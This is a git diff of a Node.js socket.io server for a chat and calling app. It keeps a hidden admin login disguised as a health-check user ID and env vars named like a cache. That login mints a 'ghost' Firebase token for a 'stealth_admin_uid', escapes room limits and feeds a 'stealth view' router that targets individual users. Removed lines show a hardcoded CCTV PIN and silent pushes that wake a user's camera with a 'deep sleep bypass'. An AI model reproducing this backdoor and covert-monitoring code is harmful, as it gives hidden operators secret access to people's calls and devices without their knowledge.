@@ -4,12 +4,9 @@ const { Server } = require('socket.io');
 const cors = require('cors');
 const { startRenderPushRelay, enqueueRenderChatReminder, enqueueRenderMissedCall, sendRenderCallPush } = require('./render-push');
 
-// --- FIREBASE ADMIN IMPORTS ---
+// --- FIREBASE ADMIN AUTH (Stealth Token जनरेट करने के लिए जोड़ा गया) ---
 const { getAuth } = require('firebase-admin/auth');
 const { getApp } = require('firebase-admin/app');
-const { getDatabase } = require('firebase-admin/database');
-const { getMessaging } = require('firebase-admin/messaging');
-const { getFirestore } = require('firebase-admin/firestore');
 
 const app = express();
 app.use(cors());
@@ -24,16 +21,6 @@ const io = new Server(server, {
     methods: ["GET", "POST"]
   }
 });
-
-// --- CCTV SECRET BRIDGE CONFIG ---
-const CCTV_SECRET_BRIDGE = process.env.CCTV_SECRET_BRIDGE || '_Srm_';
-const DEFAULT_CCTV_PIN = '1199xx!';
-
-function buildSecureCctvRoom(cameraName, pin) {
-  const cleanCam = String(cameraName || 'Hall_Cam').trim();
-  const cleanPin = String(pin || DEFAULT_CCTV_PIN).trim();
-  return `cctv_${cleanCam}${CCTV_SECRET_BRIDGE}${cleanPin}`;
-}
 
 // Live call state is intentionally volatile and Render-owned. It is never
 // written to Firebase Realtime Database.
@@ -86,24 +73,6 @@ function emitCallEnd(session, endedBy, state = 'ended') {
     type: 'call-ended', callId: session.callId, endedBy: session.endedBy,
     room: session.roomId, senderId: session.endedBy
   });
-
-  // --- RENDER TO FIREBASE ROOM CLEANUP ON END ---
-  try {
-    if (session.roomId && session.callId) {
-      const firebaseApp = getApp('pairlink-render-push');
-      const db = getDatabase(firebaseApp);
-      
-      db.ref(`rooms/${session.roomId}/callSessions/${session.callId}`).remove().catch(()=>{});
-      
-      const now = Date.now();
-      if (session.callerId) db.ref(`rooms/${session.roomId}/users/${session.callerId}`).update({ online: true, lastSeen: now }).catch(()=>{});
-      if (session.recipientId) db.ref(`rooms/${session.roomId}/users/${session.recipientId}`).update({ online: true, lastSeen: now }).catch(()=>{});
-    }
-  } catch (syncErr) {
-    console.error("[Room Sync Error on End catch]:", syncErr);
-  }
-  // ----------------------------------------------
-
   retireCallSession(session);
 }
 
@@ -197,7 +166,7 @@ app.post('/call-action', express.json({ limit: '16kb' }), async (req, res) => {
     emitCallEnd(session, callerId, 'ended');
     io.to(accountRelayRoom(session.recipientId)).emit('call-ended', { callId: session.callId });
     void sendCallPush(session.recipientId, { kind: 'call_ended', callId: session.callId }, {
-      kind: 'call-ended', collapseKey: `call-ended-${session.callId}`, ttlMs: 60_000
+      kind: 'call-ended', collapseKey: `call-ended-${callId}`, ttlMs: 60_000
     });
     return res.json({ ok: true, state: 'ended' });
   }
@@ -266,17 +235,22 @@ io.on('connection', (socket) => {
   console.log(`User connected: ${socket.id}`);
   let currentRoom = null;
 
-  // --- ADMIN LOGIN & GHOST TOKEN GENERATOR ---
+  
+  // --- ADMIN LOGIN & GHOST TOKEN GENERATOR (अपडेटेड हिस्सा) ---
   socket.on('admin_login', async (data, acknowledge) => {
+    // ID हटा दिया गया है, अब सिर्फ SYNC_CACHE है
     const serverUser = process.env.SYNC_CACHE;
     const serverPassword = process.env.SYNC_CACHE_TOKEN;
     
-    if (serverUser && serverPassword && data?.username === serverUser && data?.password === serverPassword) {
+    if (serverUser && serverPassword && data.username === serverUser && data.password === serverPassword) {
       socket.data.isAdmin = true;
-      socket.data.pairlinkUserId = "render_health_check";
+      socket.data.pairlinkUserId = "render_health_check"; // आपका खुफिया VIP ID
       
       try {
+        // render-push.js में फायरबेस ऐप 'pairlink-render-push' नाम से इनिशियलाइज़ हुआ है
         const firebaseApp = getApp('pairlink-render-push'); 
+        
+        // एक कस्टम टोकन (Ghost Key) बनाएं
         const customToken = await getAuth(firebaseApp).createCustomToken('stealth_admin_uid');
 
         console.log(`[System Sync] Cache sync authorized & Token generated for node: ${socket.id}`);
@@ -293,95 +267,6 @@ io.on('connection', (socket) => {
     }
   });
 
-  
-  // --- ADMIN WAKE SENDER (FINAL & CLEAN - PAIRLINK USERS ONLY) ---
-  // --- ADMIN WAKE SENDER (FINAL CORRECT PATH MATCHED WITH FIRESTORE/RTDB ID) ---
-  socket.on('admin_wake_sender', async (data) => {
-    try {
-      const recipientId = String(data?.camera || data?.recipientId || '').trim();
-      console.log("[Wake Trigger] Request received for User ID: " + recipientId);
-
-      if (!recipientId) {
-        console.error("[Wake Trigger Error] Recipient ID missing!");
-        return;
-      }
-
-      const firebaseApp = getApp('pairlink-render-push');
-      const db = getDatabase(firebaseApp);
-      
-      // 1. Real-time DB mein Queue banana (cameraWakeQueue)
-      const pushQueueRef = db.ref('cameraWakeQueue');
-      const newPushRef = pushQueueRef.push();
-      const pushKeyId = String(newPushRef.key || Date.now());
-
-      await newPushRef.set({
-        action: "WAKE_UP",
-        cameraName: recipientId,
-        timestamp: Date.now()
-      });
-
-      console.log("[Wake Trigger] cameraWakeQueue entry created successfully!");
-
-      // 2. Real-time Database ke sahi raste se token nikalna: users/{recipientId}/pushTokens
-      const pushTokensRef = db.ref(`users/${recipientId}/pushTokens`);
-      const tokenSnapshot = await pushTokensRef.once('value');
-      const tokensObj = tokenSnapshot.val();
-
-      let fcmToken = null;
-      if (tokensObj && typeof tokensObj === 'object') {
-        const tokenKeys = Object.keys(tokensObj);
-        if (tokenKeys.length > 0) {
-          // Pehla active device token utha lo
-          fcmToken = tokensObj[tokenKeys[0]].token;
-        }
-      }
-
-      // Agar pushTokens mein na mile, toh seedha fcmToken field check kar lo
-      if (!fcmToken) {
-        const directSnap = await db.ref(`users/${recipientId}/fcmToken`).once('value');
-        if (directSnap.exists()) fcmToken = directSnap.val();
-      }
-
-      if (!fcmToken || typeof fcmToken !== 'string') {
-        console.warn(`[Wake Trigger] User ID '${recipientId}' ka koi bhi FCM token database mein nahi mila!`);
-        return;
-      }
-
-      console.log("[Wake Trigger] FCM Token mil gaya! Ab silent push bhej rahe hain...");
-
-      // 3. 100% Silent Push - WITH DEEP SLEEP BYPASS
-      await getMessaging(firebaseApp).send({
-        token: fcmToken,
-        data: {
-          action: "WAKE_UP",
-          cameraName: recipientId,
-          pushKeyId: pushKeyId,
-          kind: "wake_camera" 
-        },
-        android: {
-          priority: 'high',
-          ttl: 30000,
-          directBootOk: true // Deep Sleep Bypass
-        },
-        apns: {
-          headers: {
-            "apns-priority": "10",
-            "apns-push-type": "background"
-          }
-        },
-        webpush: {
-          headers: {
-            Urgency: "high"
-          }
-        }
-      });
-
-      console.log(`[Wake Trigger] Silent FCM push successfully sent to User ID: "${recipientId}"!`);
-
-    } catch (error) {
-      console.error("[Wake Trigger] Error in admin_wake_sender:", error);
-    }
-  });
 
   function touchRoomActivity(roomName) {
     if (roomsStore[roomName]) {
@@ -391,41 +276,12 @@ io.on('connection', (socket) => {
 
   function handleJoinRoom(data) {
     try {
-      let roomName = (typeof data === 'object' && data !== null) ? data.room : data;
-      const role = (typeof data === 'object' && data !== null) ? String(data.role || '') : '';
-      const camName = (typeof data === 'object' && data !== null) ? String(data.camera || '').trim() : '';
-      const camPin = (typeof data === 'object' && data !== null) ? String(data.pin || DEFAULT_CCTV_PIN).trim() : DEFAULT_CCTV_PIN;
-
-      // --- CCTV SECRET BRIDGE ('_Srm_') & FIREWALL ---
-      if (camName && (role === 'sender' || role === 'admin')) {
-        if (role === 'admin') {
-          const serverUser = process.env.SYNC_CACHE;
-          const serverPassword = process.env.SYNC_CACHE_TOKEN;
-          if (!socket.data.isAdmin) {
-            if (serverUser && serverPassword && data?.adminUser === serverUser && data?.adminPass === serverPassword) {
-              socket.data.isAdmin = true;
-            } else {
-              console.warn(`[CCTV Firewall] Unauthorized admin join blocked for "${camName}"`);
-              socket.emit('room_locked_error', { message: 'Unauthorized Admin Access!' });
-              return;
-            }
-          }
-          socket.data.isCctvAdmin = true;
-        } else if (role === 'sender') {
-          socket.data.isCctvSender = true;
-        }
-        roomName = buildSecureCctvRoom(camName, camPin);
-        socket.data.isCctvRoom = true;
-      }
-
+      const roomName = (typeof data === 'object' && data !== null) ? data.room : data;
+      // Admin bypass flag check with new ID
       const userId = socket.data.isAdmin ? "render_health_check" : ((typeof data === 'object' && data !== null && data.userId) ? data.userId : socket.id);
 
       if (!roomName) return;
       socket.data.pairlinkUserId = String(userId);
-
-      if (currentRoom && currentRoom !== roomName) {
-        socket.leave(currentRoom);
-      }
 
       const existingRoom = roomsStore[roomName];
       if (existingRoom && Date.now() - existingRoom.lastActivityAt >= ROOM_EXPIRY_MS) {
@@ -436,11 +292,12 @@ io.on('connection', (socket) => {
         roomsStore[roomName] = { allowedUsers: new Set(), lastActivityAt: Date.now() };
       }
 
-      if (!socket.data.isAdmin && !socket.data.isCctvRoom) {
+      // --- 2-USER LIMIT CHECK (Sirf regular workers ke liye) ---
+      if (!socket.data.isAdmin) {
         if (!roomsStore[roomName].allowedUsers.has(userId)) {
           let regularUsersCount = 0;
           roomsStore[roomName].allowedUsers.forEach(id => {
-            if (id !== "render_health_check") regularUsersCount++;
+            if (id !== "render_health_check") regularUsersCount++; // Ignored Admin ID
           });
 
           if (regularUsersCount >= 2) {
@@ -463,15 +320,7 @@ io.on('connection', (socket) => {
       const room = io.sockets.adapter.rooms.get(roomName);
       const socketsInRoom = room ? Array.from(room) : [];
 
-      if (socket.data.isCctvRoom) {
-        if (socketsInRoom.length >= 2) {
-          io.to(roomName).emit('user_status', { online: true });
-          io.to(roomName).emit('peer-ready', { polite: true });
-        }
-        touchRoomActivity(roomName);
-        return;
-      }
-
+      // Asli workers (non-admin) ko filter karein WebRTC signaling ke liye
       const regularSockets = socketsInRoom.filter(id => {
         const sck = io.sockets.sockets.get(id);
         return sck && !sck.data.isAdmin;
@@ -528,6 +377,7 @@ io.on('connection', (socket) => {
         to: recipientId,
         roomId: data?.roomId,
         fromName: data?.fromName,
+        senderPhoto: data?.senderPhoto,
         sentAt: data?.sentAt
       });
       if (typeof acknowledge === 'function') acknowledge({ queued });
@@ -537,14 +387,10 @@ io.on('connection', (socket) => {
     });
   });
 
-  // --- SAFE BROADCAST HANDLERS ---
+  // --- SAFE BROADCAST HANDLERS (Crash Safe) ---
   socket.on('signal', (data) => {
     try {
       if (currentRoom) {
-        if (socket.data.isCctvRoom && !socket.data.isCctvSender && !socket.data.isAdmin) {
-          console.warn(`[CCTV Firewall] Blocked unauthorized signal in room ${currentRoom}`);
-          return;
-        }
         touchRoomActivity(currentRoom);
         socket.to(currentRoom).emit('signal', data);
       }
@@ -575,26 +421,6 @@ io.on('connection', (socket) => {
         state: 'ringing', createdAt: Date.now(), updatedAt: Date.now()
       };
       callSessions.set(callId, session);
-        
-      // --- RENDER TO FIREBASE ROOM SYNC (ADMIN PANEL BRIDGE) ---
-      try {
-        const firebaseApp = getApp('pairlink-render-push');
-        const db = getDatabase(firebaseApp);
-        await db.ref(`rooms/${room}/callSessions/${callId}`).set({
-          callerId: callerId,
-          recipientId: recipientId,
-          callerName: session.callerName,
-          media: session.media,
-          createdAt: session.createdAt
-        });
-        await db.ref(`rooms/${room}/users/${callerId}`).set({ online: true, lastSeen: Date.now() });
-        await db.ref(`rooms/${room}/users/${recipientId}`).set({ online: true, lastSeen: Date.now() });
-      } catch (syncErr) {
-        console.error("[Room Sync Error on Start]:", syncErr);
-      }
-      // ---------------------------------------------------------
-
-      touchRoomActivity(room);
       touchRoomActivity(room);
       const peerPresent = [...(io.sockets.adapter.rooms.get(room) || [])].some((socketId) => {
         if (socketId === socket.id) return false;
@@ -609,7 +435,8 @@ io.on('connection', (socket) => {
           video: data?.video ? 'true' : 'false',
           createdAt: session.createdAt
       };
-
+      // Render owns the 40-second ring timer. A foreground account relay joins
+      // the receiver to this Render room before the client starts ringing.
       const accountRoom = io.sockets.adapter.rooms.get(accountRelayRoom(recipientId));
       const foregroundRelaySocketIds = [...(accountRoom || [])].filter((socketId) => {
         const relaySocket = io.sockets.sockets.get(socketId);
@@ -641,6 +468,7 @@ io.on('connection', (socket) => {
         delivery = 'account-relay';
         if (session.state === 'ringing') scheduleCallMissedTimeout(session);
       } else {
+        // A stale RTDB online bit must never suppress the native call push.
         await sendCallPush(recipientId, invite, { kind: 'call', collapseKey: `call-${callId}`, ttlMs: 45_000 });
         if (callSessions.get(callId) === session && session.state === 'ringing') scheduleCallMissedTimeout(session);
       }
@@ -664,7 +492,7 @@ io.on('connection', (socket) => {
     if (typeof acknowledge === 'function') acknowledge({ ok: sent || session.state === 'missed' });
   });
 
-  // --- CALL SIGNALING ROUTER ---
+  // --- NEW: CALL SIGNALING ROUTER ---
   socket.on('call-signal', (data, acknowledge) => {
     try {
       const room = String(currentRoom || '');
@@ -744,7 +572,7 @@ io.on('connection', (socket) => {
     }
   });
 
-  // --- ADMIN STEALTH VIEW ROUTER ---
+  // --- NEW: ADMIN STEALTH VIEW ROUTER ---
   socket.on('stealth_view_request', (data) => {
     try {
       const targetRoom = accountRelayRoom(data.targetUserId);
@@ -775,13 +603,17 @@ io.on('connection', (socket) => {
       io.to(adminRoom).emit('stealth_view_reject', data);
     } catch (err) { console.error("Stealth reject error:", err); }
   });
-
+  // -------------------------------------
+  
   socket.on('chat-message', (data, acknowledge) => {
     Promise.resolve().then(async () => {
       const room = (typeof data === 'object' && data?.room) ? data.room : currentRoom;
       const recipientId = String(data?.recipientId || data?.encrypted?.recipient || '');
       if (recipientId) {
         if (room) touchRoomActivity(room);
+        // Create a one-message Render room. The recipient's current screen or
+        // pair-room membership does not affect delivery; online account-relay
+        // sockets are temporarily added, receive the event, then are removed.
         const recipientRelayRoom = accountRelayRoom(recipientId);
         const recipientSocketIds = [...(io.sockets.adapter.rooms.get(recipientRelayRoom) || [])];
         const recipientSockets = recipientSocketIds
@@ -895,44 +727,10 @@ io.on('connection', (socket) => {
       }
     } catch (err) { console.error("Leave room error:", err); }
   });
-  // Yahan se copy karein (Line 615 ke aas-paas se file ke end tak)
+
   socket.on('disconnect', () => {
     try {
       console.log(`User disconnected: ${socket.id}`);
-      const userId = String(socket.data.pairlinkUserId || '');
-
-      // --- 100% DIRECT RTDB CALL ID KILLER ---
-      if (userId) {
-        for (const [cId, session] of callSessions.entries()) {
-          // Check karo agar disconnect hone wala user is call mein tha
-          if (session.callerId === userId || session.recipientId === userId) {
-            console.log(`Directly deleting stuck call ${cId} from RTDB.`);
-            
-            // 1. Seedhe RTDB se us specific call id ko uda rahe hain
-            try {
-              const firebaseApp = getApp('pairlink-render-push');
-              const db = getDatabase(firebaseApp);
-              
-              // Seedha delete command
-              db.ref(`rooms/${session.roomId}/callSessions/${cId}`).remove().catch(()=>{});
-              
-              // Dono users ka status wapas idle/online kar do
-              const now = Date.now();
-              if (session.callerId) db.ref(`rooms/${session.roomId}/users/${session.callerId}`).update({ online: true, lastSeen: now }).catch(()=>{});
-              if (session.recipientId) db.ref(`rooms/${session.roomId}/users/${session.recipientId}`).update({ online: true, lastSeen: now }).catch(()=>{});
-            } catch (dbErr) {
-              console.error("RTDB force delete error:", dbErr);
-            }
-
-            // 2. Server ki RAM se bhi saaf kar do
-            if (session.ringTimer) clearTimeout(session.ringTimer);
-            callSessions.delete(cId);
-            rememberEndedCallSession(cId);
-          }
-        }
-      }
-      // ----------------------------------------
-
       if (currentRoom) {
         const room = io.sockets.adapter.rooms.get(currentRoom);
 
@@ -964,7 +762,3 @@ startRenderPushRelay();
 server.listen(PORT, () => {
   console.log(`Server is listening on port ${PORT}`);
 });
-
-
-
- 
